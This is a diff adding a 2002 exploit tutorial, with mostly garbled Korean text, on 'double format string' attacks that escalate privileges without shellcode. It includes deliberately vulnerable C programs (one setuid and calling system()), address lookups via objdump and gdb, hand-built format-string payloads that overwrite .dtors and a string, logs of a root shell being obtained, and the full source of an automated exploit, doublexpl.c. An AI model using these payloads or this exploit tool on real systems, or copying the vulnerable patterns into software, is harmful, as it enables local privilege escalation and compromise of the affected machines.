@@ -1,0 +1,592 @@
+
+ |=======================================================================================|
+   Title: Double format string Project (Do you need Shellcode?) 
+   Author : À¯µ¿ÈÆ (Xpl017Elz) in INetCop
+   E-mail : szoahc@hotmail.com
+   Home: http://x82.i21c.net
+   Date: 2002/03/17
+ |=======================================================================================|
+
+
+  P.S: ¹®¼­ÀÇ Ã³À½¿¡ PS¸¦ ´Þ±â´Â Ã³À½ÀÌ³×¿ä...
+
+       Âü°í·Î, ÀÌ ¹®¼­´Â ÀÚ¼¼ÇÑ ³»¿ëÀ» ´ã°íÀÖÁö ¾Ê½À´Ï´Ù.
+       ÀÌ°ÍÀº Æ¯Á¤Á¶°ÇÀ» ¸¸Á·ÇßÀ»¶§¸¸ ÀÏ¾î³¯¼ö ÀÖ½À´Ï´Ù. 
+       ´Ù¸¸ ÀÌ·¯ÇÑ °ø°Ý¹ýÀÌ ÀÖ´Ù¶ó´Â°Í¸¸À» Áõ¸íÇØÁÝ´Ï´Ù.
+
+       È¸»çÀÇ ´Ù¸¥ ÇÁ·ÎÁ§Æ® ´öºÐ¿¡ ¹®¼­´Â 4¿ù¿¡ °ø°³ÇÏ¿´½À´Ï´Ù.
+       ÀÌ°ÍÀÌ ±×¸® ´ë´ÜÇÑ ÇÁ·ÎÁ§Æ®´Â ¾Æ´Õ´Ï´Ù. 
+       ÇÏÁö¸¸ ÀÌ¿Í ¶Ç´Ù¸¥ °ø°Ý±â¹ýµµ ¿¬±¸ÇÒ °¡´É¼º?À» ÁÝ´Ï´Ù.
+       ´ÜÁö ´«À¸·Î Áñ±é½Ã´Ù. ^^
+
+       Shellcode ¾øÀÌ format string ÇÒ¼ö ÀÖ´Â ÁÁÀº ¹æ¹ýÀ» ¾Æ½Ã´ÂºÐÀº
+       Àú¿¡°Ô mail ÁÖ½Ã±â ¹Ù¶ø´Ï´Ù. ±×·³, Áñ°Å¿î exploit ÇÏ½Ê½Ã¿À. :-)
+
+
+  * ¸ñÂ÷ ¾øÀ½.
+
+ 
+ |=======================================================================================|
+
+
+ ´ÙÀ½Àº ¼³¸íÀ» À§ÇØ °£´ÜÈ÷ test exploitÇÒ babo? ÇÁ·Î±×·¥ÀÌ´Ù.
+
+
+ [= source: test.c ==========================================================]
+
+ #include <stdio.h>
+ 
+ char x0x[100] = "[It's x0x buffer]";
+ static void funx(void);
+ 
+ int main() {
+        char x82[100];
+ 
+        printf("input: ");
+        fgets(x82, 100, stdin);
+        printf("output: "); printf(x82); /* babo, it's bug! */
+        exit(0);
+ }
+ 
+ void funx(void) {
+        printf("x0x buffer message: %s\n", x0x);
+ }
+
+ [===========================================================================]
+
+
+ [root@xpl017elz tmp]# gcc -o test test.c && ./test
+ input: x82
+ output: x82
+ [root@xpl017elz tmp]#     
+  
+ ÄÄÆÄÀÏ°ú ÇÔ²² ½ÇÇàÈÄ ÇÁ·Î±×·¥Àº ¹®ÀÚ¿­ ÀÔ·ÂÀ» ¿ä±¸ÇÏ¿´´Ù.
+ "x82"¶ó´Â ¹®ÀÚ¿­À» ÀÔ·ÂÇØº» °á°ú "x82"¶ó´Â Ãâ·Â°á°ú¸¦ ¾òÀ»¼ö ÀÖ´Ù.
+
+ ´ÙÀ½°ú °°ÀÌ exploit¿¡ ÇÊ¿äÇÑ address¸¦ ±¸ÇÑ´Ù.
+ 
+ [root@xpl017elz tmp]# objdump -h test | grep .dtors
+  18 .dtors        00000008  080495f0  080495f0  000005f0  2**2
+ [root@xpl017elz tmp]# objdump --syms test | grep funx
+ 080484b4 l     F .text  00000017              funx
+ [root@xpl017elz tmp]# 
+
+ Á¤¸®ÇÏ¸é, test ÇÁ·Î±×·¥ÀÇ Overwrite ½ÃÅ³ .dtors(+4byte) sectionÀÇ 
+ address´Â 0x080495f4ºÎÅÍ ½ÃÀÛÇÑ´Ù. ±×¸®°í, funx() ÇÔ¼ö°¡ À§Ä¡ÇÏ´Â 
+ address´Â 0x080484b4ÀÌ´Ù. 
+
+ ----------------------------------------------------------------------------
+ (gdb) disass funx
+ Dump of assembler code for function funx:
+ 0x80484b4 <funx>:       push   %ebp
+ 0x80484b5 <funx+1>:     mov    %esp,%ebp
+ 0x80484b7 <funx+3>:     push   $0x8049580
+ 0x80484bc <funx+8>:     push   $0x8048531
+ 0x80484c1 <funx+13>:    call   0x8048384 <printf>
+ 0x80484c6 <funx+18>:    add    $0x8,%esp
+ 0x80484c9 <funx+21>:    leave
+ 0x80484ca <funx+22>:    ret
+ 0x80484cb <funx+23>:    nop
+ 0x80484cc <funx+24>:    nop
+ 0x80484cd <funx+25>:    nop
+ 0x80484ce <funx+26>:    nop
+ 0x80484cf <funx+27>:    nop
+ End of assembler dump.
+ (gdb) x/s 0x8049580
+ 0x8049580 <x0x>:         "[It's x0x buffer]"
+ (gdb) x/s 0x8048531
+ 0x8048531 <_IO_stdin_used+21>:   "x0x buffer message: %s\n"
+ (gdb)         
+ ---------------------------------------------------------------------------
+
+ ÀúÀåµÈ ¹®ÀÚ¿­Àº 0x08049580¿¡ Á¸ÀçÇÏ°í ÀÖÀ½À» ¾Ë¼öÀÖ´Ù.
+ ½ÃµµÇÒ exploitÀÇ ¸ñÇ¥´Â ´ë°­ ´ÙÀ½°ú °°´Ù.
+
+ 0x00. ÀÏ¹ÝÀûÀÎ format string bug¸¦ ÀÏÀ¸ÄÑ ÇÔ¼ö funx()¸¦ .dtors sectionÀ» 
+       µ¤¾î¾º¿î´Ù.
+ 0x01. ¹®ÀÚ¿­ "[It's x0x buffer]"¸¦ ´Ù¸¥ ÁÖ¼Ò°ªÀ¸·Î µ¤¾î¾º¿ö ¿øÇÏ´Â ¹®ÀÚ¿­À» 
+       Ãâ·ÂÇÒ¼ö ÀÖµµ·Ï test exploitÀ» ½ÃµµÇÑ´Ù.   
+ 0x02. Ãâ·Â °á°ú¸¦ Áñ±ä´Ù?
+
+ °¡Àå ÇÊ¿äÇÑ°ÍÀº ÇÑ¹ø¿¡ µÎ ¿µ¿ªÀÇ ¼­·Î ´Ù¸¥ ÁÖ¼Ò°ª µ¤¾î¾²±â¸¦ ¼º°øÇØ¾ß 
+ ÇÑ´Ù´Â Á¡ÀÌ´Ù. ÀÏ¸í "Double format string"ÀÌ¶ó ÀÌ¸§À» Áö¾îºÃ´Ù.
+ ¾î¿ï¸®Áö ¾Ê´Â ÀÌ¸§ÀÌ¶ó »ý°¢µÇ¸é ³ª¿¡°Ô ÇÇµå¹é ¹Ù¶õ´Ù.
+
+ ¾îÂ·µç, Double format stringÀ» ÅëÇØ funx() ÇÔ¼ö¸¦ ºÒ·¯¿ÂÈÄ ¹®ÀÚ¿­ÀÇ 
+ address¸¦ º¯°æÇÏ·Á¸é ´ÙÀ½°ú °°ÀÌ exploit ÇØº¸±â·Î ÇÑ´Ù.
+
+ ---------------------------------------------------------------------------
+
+  \x82\x82\x82\x82\xf4\x95\x04\x08            ->          .dtors address,
+  \x82\x82\x82\x82\xf6\x95\x04\x08            ->          .dtors address,
+  \x82\x82\x82\x82\x80\x95\x04\x08            ->          string address,
+  \x82\x82\x82\x82\x82\x95\x04\x08            ->          string address,
+  %%33940x%%n%%33616x%%n                      -> funx() function address, 
+  %%14653x%%n%%65536x%%n                      ->              0x41414141.
+
+ ---------------------------------------------------------------------------
+ = °á  °ú: =================================================================
+
+ [root@xpl017elz tmp]# (printf "\x82\x82\x82\x82\xf4\x95\x04\x08\x82\x82\x82\x
+ 82\xf6\x95\x04\x08\x82\x82\x82\x82\x80\x95\x04\x08\x82\x82\x82\x82\x82\x95\x
+ 04\x08%%33940x%%n%%33616x%%n%%14653x%%n%%65536x%%n";cat)|./test
+ 
+ input: output: ‚‚‚‚?‚‚‚ö‚‚‚‚€‚‚‚‚?        
+
+                                           ~~     82828282
+
+         ~~ 82828282
+                  ~~              .. Áß ·« ..                  82828282
+                                                      ~~          
+  
+                                              82828282
+ x0x buffer message: AAAA
+
+ [root@xpl017elz tmp]#
+
+ ============================================================================
+
+ ¹®ÀÚ¿­ "[It's x0x buffer]"¸¦ "AAAA"·Î µ¤¾î ¾º¿ì´Âµ¥ ¼º°øÇÏ¿´´Ù.
+ format stringÀ» ÀÌ¿ëÇÏ¿© ¿øÇÏ´Â buffer¿¡ ÀÓÀÇÀÇ address¸¦ µ¤À»¼ö ÀÖ´Â 
+ °¡´É¼ºÀ» È®ÀÎÇÏ¿´´Ù. ÇÏÁö¸¸, ±× ¹æ¹ýÀÌ ¿Ïº®ÇÏÁö ¸øÇÏ°í µ¤¾î¾²Áö ¸øÇÏ´Â 
+ ¿µ¿ªÀÌ Á¸ÀçÇÏ±â ¶§¹®¿¡ ¾î·Á¿òµµ ÀÖ´Ù.
+
+ ±×·¸´Ù¸é, ½ÇÁ¦ exploitÇÒ Å×½ºÆ® ÇÁ·Î±×·¥À» Â¥º¸µµ·Ï ÇÏ°Ú´Ù.
+
+
+ [= source: realping.c =====================================================]
+
+ #include <stdio.h>
+ #include <string.h>
+ 
+ char x0x[100] = "/bin/ping";
+ 
+ int main(int argc, char *argv[]) {
+ 
+    int uid = getuid();
+    char      x82[100];
+ 
+    if(argc < 2) {
+        printf("Usage: %s [host ip]\n", argv[0]);
+        exit(-1);
+    } 
+    printf("host ip: ");
+ 
+    /************** 'Very Easy' format string hole **************/
+ 
+    strncpy(x82, argv[1], 80);
+    strncat(x82, "\n",20);
+ 
+    printf(x82);
+
+    if(uid == 0) {
+        ping(x82);
+    } 
+    printf("User is not root (uid 0)\n");
+    exit(0);
+ 
+ }
+ ping(char *ip) {
+ 
+    char buf[100];
+ 
+    snprintf(buf,100,"%s %s", x0x, ip);
+    system(buf); 
+    exit(0);
+ 
+ }                     
+
+ [==========================================================================]
+
+
+ * ÀÌ ¸ÛÃ»ÇÑ ÇÁ·Î±×·¥Àº ¸Å¿ì °£´ÜÈ÷ Â¥¿©Á³±â ¶§¹®¿¡ ´Ù¼öÀÇ ¹ö±×¸¦ Áö´Ï°í 
+   ÀÖ´Ù´Â »ç½ÇÀ» ¾Ë¾ÆµÎ¶ó.
+
+
+ ÀÏ¹Ý À¯Àú°¡ ½ÇÇàÇÏ¸é, ´ÙÀ½°ú °°Àº ½ÇÇà°á°ú¸¦ Ãâ·ÂÇÑ´Ù. 
+
+ [x82@xpl017elz tmp]$ ./realping
+ Usage: ./realping [host ip]
+ [x82@xpl017elz tmp]$ ./realping 61.37.177.34
+ host ip: 61.37.177.34
+ User is not root (uid 0)
+ [x82@xpl017elz tmp]$    
+
+ root À¯Àú°¡ ½ÇÇàÇÏ¸é ´ÙÀ½°ú °°Àº ½ÇÇà°á°ú¸¦ Ãâ·ÂÇÑ´Ù. 
+
+ [root@xpl017elz tmp]# ./realping 61.37.177.34
+ host ip: 61.37.177.34
+ PING 61.37.177.34 (61.37.177.34) from 61.37.177.33 : 56(84) bytes of data.
+ 64 bytes from 61.37.177.34: icmp_seq=0 ttl=255 time=0.3 ms
+ 64 bytes from 61.37.177.34: icmp_seq=1 ttl=255 time=0.1 ms
+ 64 bytes from 61.37.177.34: icmp_seq=2 ttl=255 time=0.1 ms
+  
+ --- 61.37.177.34 ping statistics ---
+ 3 packets transmitted, 3 packets received, 0% packet loss
+ round-trip min/avg/max = 0.1/0.1/0.3 ms
+ [root@xpl017elz tmp]#     
+ 
+ ÇÁ·Î±×·¥Àº "host ip" Ãâ·ÂºÎºÐ¿¡¼­ format string bug¸¦ °¡Áö°í ÀÖ´Ù.
+ ÀÌ°ÍÀ» exploit ÇÏ±âÀü¿¡ ¾î¶² ¹æ½ÄÀ¸·Î °ø°ÝÇÒ°ÍÀÎÁö¸¦ »ý°¢ÇØº¸ÀÚ.
+
+ - ´ÙÀ½ÀÇ code¿¡¼­ format stringÀ» ÀÏÀ¸Å²´Ù. -------------------------------
+
+ ...
+
+ printf(x82);
+
+ ...
+
+ - ±×ÈÄ, uid°¡ 0ÀÎÁö¸¦ checkÇÏ´Â if¹®ÀÌ ³ª¿Â´Ù. ----------------------------
+
+ ...
+
+ if(uid == 0) {
+ ping(x82);
+ } 
+ printf("User is not root (uid 0)\n");
+ exit(1);
+
+ ...
+
+ ---------------------------------------------------------------------------
+
+ ¸¸¾à uid°¡ 0ÀÌ¶ó¸é ping() ÇÔ¼ö°¡ ¼öÇàµÈ´Ù. ±×·¯³ª uid°¡ 0ÀÌ ¾Æ´Ï¸é 
+ ¿¡·¯¸Þ¼¼Áö¸¦ Ãâ·ÂÈÄ exitÇÏ°Ô µÈ´Ù. 
+
+ ÀÌ¿¡ ¾Õ¼­ ¸ÕÀú test exploit ÇØº»°ÍÀ» Âü°íÇÏ¸é, if¹®À» ¿ìÈ¸ÇÒ¼ö ÀÖ´Â ¹æ¹ýÀÌ 
+ »ý±ä´Ù. if¹®À» ¿ìÈ¸ÇÑÈÄ¿¡´Â ÀÏ¸í: "Double format string"À» ÀÌ¿ëÇÏ¿© Shellcode
+ ¾øÀÌµµ shellÀ» ¶ç¿ï¼ö ÀÖÀ»°Í °°´Ù! :-)
+
+ ±×·¸´Ù¸é, 'Happy Exploit' ÇØº¸ÀÚ.
+
+ ---------------------------------------------------------------------------
+ [x82@xpl017elz tmp]$ objdump -h realping | grep .dtors
+  17 .dtors        00000008  08049730  08049730  00000730  2**2
+ [x82@xpl017elz tmp]$ objdump --syms realping | grep ping
+ 080485b4 g     F .text  0000003e              ping
+ [x82@xpl017elz tmp]$ gdb -q realping
+ (gdb) disass ping
+ Dump of assembler code for function ping:
+ 0x80485b4 <ping>:       push   %ebp
+ 0x80485b5 <ping+1>:     mov    %esp,%ebp
+ 0x80485b7 <ping+3>:     sub    $0x64,%esp
+ 0x80485ba <ping+6>:     mov    0x8(%ebp),%eax
+ 0x80485bd <ping+9>:     push   %eax
+ 0x80485be <ping+10>:    push   $0x80496c0
+ 0x80485c3 <ping+15>:    push   $0x804868b
+ 0x80485c8 <ping+20>:    push   $0x64
+ 0x80485ca <ping+22>:    lea    0xffffff9c(%ebp),%eax
+ 0x80485cd <ping+25>:    push   %eax
+ 0x80485ce <ping+26>:    call   0x8048428 <snprintf>
+ 0x80485d3 <ping+31>:    add    $0x14,%esp
+ 0x80485d6 <ping+34>:    lea    0xffffff9c(%ebp),%eax
+ 0x80485d9 <ping+37>:    push   %eax
+ 0x80485da <ping+38>:    call   0x80483d8 <system>
+ 0x80485df <ping+43>:    add    $0x4,%esp
+ 0x80485e2 <ping+46>:    push   $0x0
+ 0x80485e4 <ping+48>:    call   0x8048438 <exit>
+ 0x80485e9 <ping+53>:    add    $0x4,%esp
+ 0x80485ec <ping+56>:    lea    0x0(%esi,1),%esi
+ 0x80485f0 <ping+60>:    leave
+ 0x80485f1 <ping+61>:    ret
+ ---Type <return> to continue, or q <return> to quit---q
+ Quit
+ (gdb) x/s 0x80496c0
+ 0x80496c0 <x0x>:         "/bin/ping"
+ (gdb) x/s 0x804868b
+ 0x804868b <_IO_stdin_used+63>:   "%s %s"
+ (gdb) 
+ ---------------------------------------------------------------------------
+
+ À§¿Í °°ÀÌ address¸¦ ±¸Çß´Ù. ÀÌÁ¦ shellÀ» ¶ç¿ì´Â ÀÏ¸¸ ³²Àº°ÍÀÎ°¡? 
+ ¾ÕÀ¸·ÎÀÇ °£´ÜÇÑ °èÈ¹À» ¸»ÇÏÀÚ¸é,
+
+ 0x00. .dtors sectionÀ» ping() ÇÔ¼öÀÇ ÁÖ¼Ò·Î µ¤¾î¾º¿î´Ù..
+ 0x01. ±×ÈÄ, x0x º¯¼ö¿¡ ÀúÀåµÇÀÖ´Â ¹®ÀÚ¿­ "/bin/ping"ÀÇ ÁÖ¼Ò°ªÀ» ±¸ÇÑ´Ù. 
+ 0x02. ±¸ÇØÁø ÁÖ¼Ò°ª¿¡ "/bin/sh"¸¦ ½ÇÇàÇÏ´Â ¸í·ÉÀ¸·Î µ¤¾î¾º¿î´Ù.
+ 0x03. ±× ´ÙÀ½¿¡´Â ¾ÆÁÖ ÀÌ»Ú°Ô ¶á RootshellÀ» º¼¼öÀÖÀ»°Í °°´Ù.
+
+ exploitÀº ´ÙÀ½°ú °°ÀÌ µÇ¾ú´Ù.
+
+ ---------------------------------------------------------------------------
+
+  \x82\x82\x82\x82\x34\x97\x04\x08            ->          .dtors address,
+  \x82\x82\x82\x82\x36\x97\x04\x08            ->          .dtors address,
+  \x82\x82\x82\x82\xc0\x96\x04\x08            ->          string address,
+  \x82\x82\x82\x82\xc2\x96\x04\x08            ->          string address,
+  %%34196x%%n%%33360x%%n                      -> ping() function address,
+  %%24687x%%n%%38856x%%n                      ->              0x003b6873.
+
+ ---------------------------------------------------------------------------
+ = °á  °ú: =================================================================
+
+ 
+ [x82@xpl017elz tmp]$ perl -e 'system "./realping","\x82\x82\x82\x82\x34\x
+ 97\x04\x08\x82\x82\x82\x82\x36\x97\x04\x08\x82\x82\x82\x82\xc0\x96\x04\x08\x
+ 82\x82\x82\x82\xc2\x96\x04\x08%34196x%n%33360x%n%24687x%n%38856x%n"'
+ host ip: ‚‚‚‚‚‚‚‚‚‚‚‚‚‚‚‚                                      
+
+                  ~~  82828282
+                                          ~~
+
+                                                         82828282  ~~
+
+                                  .. Áß ·« ..
+
+    82828282  ~~                                             
+ 
+                                                     ~~
+                                                                         8282
+ 8282
+ User is not root (uid 0)
+ bash# id
+ uid=501(x82) gid=501(x82) euid=0(root) groups=501(x82),10(wheel),503(secure)
+ bash# whoami
+ root
+ bash# exit
+ exit
+ sh: û¿?@ŒT@?: command not found
+ [x82@xpl017elz tmp]$  
+
+ ============================================================================
+
+ W0W~! Shellcode ¾øÀÌµµ RootshellÀ» È¹µæÇÏ¿´´Ù. ¾î¶»°Ô ÀÌ·¯ÇÑ °á°ú°¡ ³ª¿À°Ô 
+ µÇ¾ú´ÂÁö °£´ÜÈ÷ ºÐ¼®ÇØº¸ÀÚ.
+
+ - ping() ÇÔ¼öÀÇ ³»ºÎ¿¡´Â system() ÇÔ¼ö¸¦ »ç¿ëÇÏ°í ÀÖ´Ù. --------------------
+
+ ...
+
+ ping(char *ip) {
+ 
+    char buf[100];
+ 
+    snprintf(buf,100,"%s %s", x0x, ip);
+    system(buf); 
+    exit(0);
+ 
+ } 
+
+ ...
+
+ ----------------------------------------------------------------------------
+
+ buf º¯¼ö¿¡´Â x0x º¯¼öÀÇ ¹®ÀÚ¿­ ³»¿ëÀÌ º¹»çµÇ°í, ÇÁ·Î±×·¥ÀÇ ÀÎ¼ö·Î ÀÔ·ÂÇÑ ip°¡ 
+ copyµÈ´Ù. ÀÌ°ÍÀ» ½ÇÇàÇÏ±â À§ÇØ ¸ÕÀú .dtors¸¦ µ¤¾î¾º¿ö ping() ÇÔ¼ö¸¦ È£ÃâÇÏ°Ô 
+ ÇÑ°ÍÀÌ´Ù. ±× ´ÙÀ½, x0x º¯¼öÀÇ ¹®ÀÚ¿­À» µ¤¾î¾º¿î ÁÖ¼Ò°ªÀº 0x003b6873ÀÌ¾ú´Ù.
+ 
+ ÀÌ °ªÀº ½ÇÁ¦ stack¿¡ ÀúÀåµÉ¶§ "sh;" ¶ó´Â ¹®ÀÚ¿­·Î ¾º¿öÁø´Ù. ÀÌ¹Ì "/bin/ping" 
+ ¹®ÀÚ¿­ÀÇ ÁÖ¼Ò À§Ä¡¸¦ Ã£¾Ò±â ¶§¹®¿¡ ping ÇÁ·Î±×·¥ ´ë½Å °ø°ÝÀÚ°¡ ¿øÇÏ´Â shell
+ "/bin/sh"¸¦ ½ÇÇàÇÒ¼ö ÀÖ¾ú´ø°ÍÀÌ´Ù. :-D
+
+ ¾ÆÁÖ °£´ÜÇÑ ¿ø¸®Áö¸¸ shellcode¸¦ ÀÌ¿ëÇÒ¼ö ¾ø´Â ÃÖ¾ÇÀÇ È¯°æÀÌ³ª ¿ìÈ¸±â¹ýÀ»
+ ÇÊ¿ä·Î ÇÒ¶§´Â ´ÜÁö, Áñ°Ì±â À§ÇØ ÀÌ ¹æ¹ýÀ» ¼±ÅÃÇÒÁö ¸ð¸¥´Ù.
+
+ ´ÙÀ½ source code´Â shellcode ¾øÀÌ format string attackÀ» ÇÏ´Â Âü°í exploitÀÌ´Ù.
+ À§ÀÇ realping.c source¸¦ ÄÄÆÄÀÏÇÑÈÄ test ÇØº¸±â ¹Ù¶õ´Ù.
+ ±×¸® Àß Â¥¿©Áø source code´Â ¾Æ´ÏÁö¸¸, ¿¬±¸ÇØº¸´Â°Íµµ ÁÁÀº ¹æ¹ýÀÏ°ÍÀÌ¶ó »ý°¢µÈ´Ù.
+
+ »ç¿ë TEST:
+
+  [x82@xpl017elz x82]$ ./doublexpl -?
+ 
+   Double format string exploit
+                               exploit by Xpl017Elz
+  ./doublexpl: ºÎÀûÀýÇÑ ¿É¼Ç -- ?
+ 
+   Usage: ./doublexpl -p [target program] -f [target function] -s [target string]
+ 
+  [x82@xpl017elz x82]$ ls -al realping
+  -rwsr-xr-x   1 root     root        12697 Apr 11 01:41 realping
+  [x82@xpl017elz x82]$
+  [x82@xpl017elz x82]$ ./doublexpl
+ 
+  Double format string exploit
+                              exploit by Xpl017Elz
+ 
+  Overwrite .dtors section: 0x8049734
+  Function "ping()": 0x80485b4
+  String "/bin/ping": 0x80496c0
+ 
+  host ip: ‚‚‚‚‚‚‚‚‚‚‚‚‚‚‚‚     
+
+
+                                   .. Áß ·« ..
+
+                                                                          8282
+  8282
+  User is not root (uid 0)
+  bash#
+
+ [= source: doublexpl.c =====================================================]
+
+ /*
+ **========================================================================**
+ ** Double format string Project
+ **
+ ** exploit by "you dong-hun"(Xpl017Elz), <szoahc@hotmail.com>. 
+ ** My World: http://x82.i21c.net
+ **
+ ** Special Greets: INetCop team, WOWhacker.org (wowcode team).
+ **========================================================================**
+ */
+
+ #include <stdio.h>
+ #include <sys/stat.h>
+
+ #define OBJDUMP   "/usr/bin/objdump"
+ #define EGREP           "/bin/egrep"
+ #define GREP             "/bin/grep"
+ #define AWK               "/bin/awk"
+ #define DEFAULT_PROGRAM "./realping"
+ #define DEFAULT_FUNC          "ping"
+ #define DEFAULT_STRING   "/bin/ping"
+
+ unsigned long dtorsfind(char *program) {
+
+  char stexec[1024];
+  FILE *fp;
+  char find[11];
+ 
+  sprintf(stexec,"%s -h %s | %s .dtors | %s -F\" \" '{print $4}'",
+  OBJDUMP, program, GREP, AWK);
+
+  fp = (FILE *)popen(stexec, "r"); 
+  fgets(find,11,fp); 
+  pclose(fp);
+  return(strtol(find, NULL, 16));
+
+ }
+
+ unsigned long funcfind(char *program, char *funx) {
+
+  char stexec[1024];
+  FILE *fp;
+  char find[11];
+  sprintf(stexec,"%s --syms %s | %s 'text.*%s' | %s -F\" \" '{print $1}'",
+  OBJDUMP, program, EGREP, funx, AWK);
+
+  fp = (FILE *)popen(stexec, "r"); 
+  fgets(find,11,fp); 
+  pclose(fp);
+  return(strtol(find, NULL, 16));
+
+ }
+
+ unsigned long stringfind(char *program, char *stringx) {
+
+  char stexec[1024];
+  FILE *fp;
+  char find[11];
+ 
+  sprintf(stexec,"%s -ds %s | %s %s | %s -F\" \" '{print $1}'",
+  OBJDUMP, program, GREP, stringx, AWK);
+
+  fp = (FILE *)popen(stexec, "r"); 
+  fgets(find,11,fp); 
+  pclose(fp);
+  return(strtol(find, NULL, 16));
+
+ }
+
+ int main(int argc, char *argv[]) {
+
+ extern char *optarg;
+ char dfprgm[100] = DEFAULT_PROGRAM,
+      dffunc[100] =    DEFAULT_FUNC,
+      dfstrg[100] =  DEFAULT_STRING, 
+           atk_buf[1024], check[16];
+
+ int            num_1, num_2, num_3, 
+                num_4, num_5, whilx;
+
+ unsigned long      dtorsection_add, 
+                      pingfunc_addr, 
+	 	         string_add, 
+		    	  plustw0_1, 
+			  plustw0_2;
+
+ struct stat                  st0cx;
+
+ printf("\n Double format string exploit \n\t\t\t     exploit by Xpl017Elz\n");
+
+ while((whilx = getopt(argc, argv, "p:f:s:")) !=EOF) {
+ switch(whilx) {
+
+     case 'p': bzero(&dfprgm, 100); strncpy(dfprgm, optarg, 100); break;
+     case 'f': bzero(&dffunc, 100); strncpy(dffunc, optarg, 100); break;
+     case 's': bzero(&dfstrg, 100); strncpy(dfstrg, optarg, 100); break;
+     case '?': usage(argv[0]);
+
+ }}
+
+ if(stat(dfprgm, &st0cx) < 0) {
+     printf("\n target program not found\n");
+     usage(argv[0]);
+ }
+
+ dtorsection_add = dtorsfind(dfprgm) + 0x00000004; 
+ plustw0_1       =   dtorsection_add + 0x00000002;
+ pingfunc_addr   =       funcfind(dfprgm, dffunc);
+ string_add      =     stringfind(dfprgm, dfstrg);
+ plustw0_2       =        string_add + 0x00000002;
+
+ printf("\n Overwrite .dtors section: %p
+ Function \"%s()\": %p
+ String \"%s\": %p\n\n", dtorsection_add, 
+ dffunc, pingfunc_addr, dfstrg, string_add);
+
+ num_1 = (pingfunc_addr >> 16) & 0xffff;
+ num_2 = (pingfunc_addr >>  0) & 0xffff;
+ num_3 = (0x003b6873    >> 16) & 0xffff; /* sh; */
+ num_4 = (0x003b6873    >>  0) & 0xffff; /* sh; */
+
+ for(num_5 = 0; num_5 <    16; num_5++) { 
+     check[num_5] = 0x00000082; /* x82 ^--^ */
+ }
+ sprintf(atk_buf,   "%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%%%ux%%n%%%ux%%n%%%ux%%n%%%ux%%n",
+
+                        check[0],                      check[1],
+                        check[2],                      check[3],
+  (dtorsection_add >>  0) & 0xff, (dtorsection_add >>  8) & 0xff,
+  (dtorsection_add >> 16) & 0xff, (dtorsection_add >> 24) & 0xff,
+                        check[4],                      check[5],
+                        check[6],                      check[7],
+        (plustw0_1 >>  0) & 0xff,      (plustw0_1 >>  8) & 0xff,
+        (plustw0_1 >> 16) & 0xff,      (plustw0_1 >> 24) & 0xff,
+                        check[8],                      check[9],
+                       check[10],                     check[11],
+       (string_add >>  0) & 0xff,     (string_add >>  8) & 0xff,
+       (string_add >> 16) & 0xff,     (string_add >> 24) & 0xff,
+                       check[12],                     check[13],
+                       check[14],                     check[15],
+        (plustw0_2 >>  0) & 0xff,      (plustw0_2 >>  8) & 0xff,
+        (plustw0_2 >> 16) & 0xff,      (plustw0_2 >> 24) & 0xff,
+                      num_2 - 32,       0x10000 + num_1 - num_2, 
+                   num_4 - num_1,       0x10000 + num_3 - num_4);
+
+ execl(dfprgm, dfprgm, atk_buf, NULL);
+
+ }
+
+ int usage(char *args) {
+    
+     printf("\n Usage: %s -p [target program] -f [target function] -s [target string]\n\n", args);
+     exit(0);
+
+ }
+
+ [===========================================================================]
+
+ Reference: The OMEGA project by lamagra <lamagra@uglypig.org>
+
+ Comment - ±×ÀÇ ±ÛÀº ³ª¿¡°Ô ... 
+           ±»ÀÌ Shellcode¸¦ »ç¿ëÇÏÁö ¾Ê°í ShellÀ» ¶ç¿ï¼ö ÀÖ´Â ¹æ¹ýÀ»
+           »ý°¢ÇÒ¼ö ÀÖ´Â ÇÏ³ªÀÇ °è±â¸¦ ¸¸µé¾î ÁÖ¾ú´Ù.
+
+
+ * Âü°í·Î, °¢ ÇÃ·§Æû¿¡ µû¸¥ exploit °á°ú´Â Ã¼Å©ÇØ ³ÖÁö ¾Ê¾Ò½À´Ï´Ù. 
+   ¾Æ¹«·¡µµ °ü·Ã³»¿ëÀº ´ÙÀ½Æí¿¡ ½Ç¸±µí? ÇÕ´Ï´Ù.
+
+
